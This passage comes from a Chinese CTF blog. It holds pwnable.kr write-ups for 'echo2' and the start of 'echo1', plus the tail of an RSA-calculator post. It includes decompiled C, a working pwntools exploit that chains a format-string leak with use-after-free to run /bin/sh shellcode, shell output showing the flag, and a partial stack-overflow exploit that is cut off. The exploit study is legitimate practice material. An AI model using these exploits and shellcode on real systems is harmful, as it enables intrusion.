hex encoded data</span><br><span class="line">- decrypted result -</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">rsa_calculator</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">what a stupid buggy rsa calculator! :(</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>读逆向代码要细心，不能急躁，否则可能会花很多时间。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/03/10/pwnable.kr-echo2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/10/pwnable.kr-echo2/" itemprop="url">
                  pwnable.kr-echo2
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-03-10 10:41:00" itemprop="dateCreated datePublished" datetime="2018-03-10T10:41:00+08:00">2018-03-10</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/03/10/pwnable.kr-echo2/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/03/10/pwnable.kr-echo2/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/03/10/pwnable.kr-echo2/" class="leancloud_visitors" data-flag-title="pwnable.kr-echo2">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这道题和上一题主逻辑一样，主要是漏洞不一样了，这道题考察格式化支付串漏洞和堆的释放后重用漏洞。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先分析反编译代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// rsi@1</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-24h]@1</span></span><br><span class="line">  _QWORD v7[<span class="number">4</span>]; <span class="comment">// [sp+10h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  o = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  *((_QWORD *)o + <span class="number">3</span>) = greetings;</span><br><span class="line">  *((_QWORD *)o + <span class="number">4</span>) = byebye;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hey, what's your name? : "</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">int</span> *)v7;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%24s"</span>, v7);</span><br><span class="line">  v4 = o;</span><br><span class="line">  *(_QWORD *)o = v7[<span class="number">0</span>];</span><br><span class="line">  v4[<span class="number">1</span>] = v7[<span class="number">1</span>];</span><br><span class="line">  v4[<span class="number">2</span>] = v7[<span class="number">2</span>];</span><br><span class="line">  id = v7[<span class="number">0</span>];</span><br><span class="line">  getchar();</span><br><span class="line">  func[<span class="number">0</span>] = (__int64)echo1;</span><br><span class="line">  qword_602088 = (__int64)echo2;</span><br><span class="line">  qword_602090 = (__int64)echo3;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"\n- select echo type -"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 1. : BOF echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 2. : FSB echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 3. : UAF echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 4. : exit"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">        v3 = &amp;v6;</span><br><span class="line">        __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6 &gt; <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> *))func[(<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v6 - <span class="number">1</span>)])(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid menu"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cleanup();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Are you sure you want to exit? (y/n)"</span>, &amp;v6);</span><br><span class="line">    v6 = getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">121</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"bye"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">echo2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [sp+0h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))o + <span class="number">3</span>))(o);</span><br><span class="line">  get_input(&amp;format, <span class="number">32L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))o + <span class="number">4</span>))(o);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">echo3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// ST08_8@1</span></span><br><span class="line"></span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))o + <span class="number">3</span>))(o);</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  get_input(s, <span class="number">32L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD, _QWORD))o + <span class="number">4</span>))(o, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序这次只实现了<code>echo2</code>和<code>echo3</code>函数。分析可以发现，<code>echo2</code>函数中有格式化字符串漏洞。利用这个漏洞可以读写任意8字节内存。开始想得利用方式是向<code>v7</code>变量（就是要输入的名字）写shellcode然后通过该漏洞改写返回地址跳转到该处执行，但是实际上栈地址是64位的想一次写入64位的整数到内存用时太长，特别是在题目平台更长。所以这种方法并不可取。<br>另一处漏洞需要<code>echo3</code>函数配合<code>main</code>函数里的一处逻辑缺陷来制造<code>uaf漏洞</code>。仔细分析<code>main</code>函数发现，如果在选择<code>4</code>选项退出时，程序会执行<code>cleanup</code>函数，该函数会执行<code>free(o)</code>释放掉先前申请的<code>0x28</code>大小的堆空间。接下来程序又会询问是否退出，否的话又会进入主逻辑执行。很明显的一处释放后重用。而<code>echo3</code>函数中申请了<code>0x20</code>大小的堆空间，根据glibc的堆管理策略，这次申请的堆会直接使用上次释放的堆块，这样如果覆盖了第4个8字节就会导致后面执行<code>(*((void (__fastcall **)(_QWORD))o + 3))(o);</code>时执行任意覆盖的地址了。利用这个漏洞就能解决<code>printf</code>写内存的困难。<br>整理下利用思路，向<code>v7</code>变量覆盖shellcode，使用<code>prinf</code>的漏洞leak处栈地址然后计算处<code>v7</code>的地址，之后利用uaf漏洞跳转到<code>v7</code>执行。下面是exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(DEBUG)</span>:</span></span><br><span class="line">    context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        r = process(<span class="string">'./echo2'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9011</span>)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span><span class="comment"># 23 bytes</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#context.terminal=['gnome-terminal','-x','sh','-c']</span></span><br><span class="line">    <span class="comment">#gdb.attach(proc.pidof(r)[0])</span></span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">' : '</span>)</span><br><span class="line">    r.sendline(shellcode)</span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'%10$016lx'</span>) <span class="comment"># get rbp addr</span></span><br><span class="line">    </span><br><span class="line">    rbp_addr = int(r.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">    v7_addr = rbp_addr<span class="number">-0x20</span></span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    r.sendline(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'(y/n)'</span>)</span><br><span class="line">    r.sendline(<span class="string">'n\n3\n'</span>+<span class="string">'a'</span>*<span class="number">24</span>+p64(v7_addr))</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">work(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ python 1.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9011: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">hello </span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaa0\x1f\xb4&gt;\xfe\x7f</span><br><span class="line">goodbye </span><br><span class="line"></span><br><span class="line">- select <span class="built_in">echo</span> <span class="built_in">type</span> -</span><br><span class="line">- 1. : BOF <span class="built_in">echo</span></span><br><span class="line">- 2. : FSB <span class="built_in">echo</span></span><br><span class="line">- 3. : UAF <span class="built_in">echo</span></span><br><span class="line">- 4. : <span class="built_in">exit</span></span><br><span class="line">&gt; sh: 1: 3: not found</span><br><span class="line">$ ls</span><br><span class="line">echo2</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">fun_with_UAF_and_FSB :)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>另外注意这是linux的x64环境下，<code>printf</code>的利用需要考虑前6个参数是寄存器传递的，要计算好。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>两个漏洞的配合最后拿下shell，很爽。</p>

          
        
      
    </div>

    

    
    
    

    

    <div>
      
    </div>

    <div>
      
    </div>

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/03/06/pwnable.kr-echo1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="r00tnb">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="R00tnb's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/03/06/pwnable.kr-echo1/" itemprop="url">
                  pwnable.kr-echo1
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-03-06 14:00:30" itemprop="dateCreated datePublished" datetime="2018-03-06T14:00:30+08:00">2018-03-06</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
              
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/03/06/pwnable.kr-echo1/#comments" itemprop="discussionUrl">
                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/03/06/pwnable.kr-echo1/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/03/06/pwnable.kr-echo1/" class="leancloud_visitors" data-flag-title="pwnable.kr-echo1">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数：</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>简单的栈溢出题目。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先分析反编译的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// rsi@1</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+Ch] [bp-24h]@1</span></span><br><span class="line">  _QWORD v7[<span class="number">4</span>]; <span class="comment">// [sp+10h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  o = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  *((_QWORD *)o + <span class="number">3</span>) = greetings;</span><br><span class="line">  *((_QWORD *)o + <span class="number">4</span>) = byebye;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hey, what's your name? : "</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">int</span> *)v7;</span><br><span class="line">  __isoc99_scanf(<span class="string">"%24s"</span>, v7);</span><br><span class="line">  v4 = o;</span><br><span class="line">  *(_QWORD *)o = v7[<span class="number">0</span>];</span><br><span class="line">  v4[<span class="number">1</span>] = v7[<span class="number">1</span>];</span><br><span class="line">  v4[<span class="number">2</span>] = v7[<span class="number">2</span>];</span><br><span class="line">  id = v7[<span class="number">0</span>];</span><br><span class="line">  getchar();</span><br><span class="line">  func[<span class="number">0</span>] = (__int64)echo1;</span><br><span class="line">  qword_602088 = (__int64)echo2;</span><br><span class="line">  qword_602090 = (__int64)echo3;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"\n- select echo type -"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 1. : BOF echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 2. : FSB echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 3. : UAF echo"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"- 4. : exit"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt; "</span>, v3);</span><br><span class="line">        v3 = &amp;v6;</span><br><span class="line">        __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v6 &gt; <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span> *))func[(<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v6 - <span class="number">1</span>)])(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid menu"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cleanup(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Are you sure you want to exit? (y/n)"</span>);</span><br><span class="line">    v6 = getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">121</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"bye"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">echo1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+0h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))o + <span class="number">3</span>))(o);</span><br><span class="line">  get_input(&amp;s, <span class="number">128</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD, _QWORD))o + <span class="number">4</span>))(o, <span class="number">128L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序主要逻辑是给出三个选项，每个选项都会执行一个<code>echo</code>函数，但是本题只实现了第一个<code>echo</code>函数。<br>分析<code>echo1</code>函数可以发现，它存在栈溢出漏洞。再看看保护<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ checksec echo1</span><br><span class="line">[*] <span class="string">'/root/\xe6\xa1\x8c\xe9\x9d\xa2/test/echo1'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>
<p>思路是在栈上布置<code>shellcode</code>然后跳转到此处执行。但是程序没有泄漏地址的地方，这里观察到main函数中<code>id</code>变量被赋予了<code>v7[0]</code>，而这里的内容是可以控制的（他就是<code>name</code>的前8字节）。于是可以通过在<code>id</code>中写入<code>jmp rsp</code>的指令来跳转到<code>shellcode</code>处执行。下面是exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(DEBUG)</span>:</span></span><br><span class="line">    context(arch=<span class="string">'amd64'</span>,os=<span 